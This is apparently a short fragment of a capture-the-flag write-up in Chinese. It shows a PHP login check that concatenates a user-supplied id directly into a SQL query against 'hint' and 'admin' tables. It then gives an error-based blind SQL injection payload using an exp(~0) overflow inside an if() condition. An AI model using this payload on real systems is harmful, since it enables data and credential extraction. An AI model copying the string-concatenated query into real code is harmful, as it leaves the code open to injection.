```php
 $sql = "SELECT * from hint,admin where hint.id = \"".$id."\"";
    $r = mysqli_query($con,$sql);
    if(!$r)
        die("sql语句炸了");
    $result = mysqli_fetch_array($r, MYSQLI_ASSOC);
    if($result === NULL){
        die("想啥呢，密码都不知道还想要gakki");
    }else{
        die("想啥呢，密码都不知道还想要gakki");
    }
```

**sql报错盲注**

```
SELECT * from hint,admin where hint.id=1  or   if(0,0,exp(~0))
```
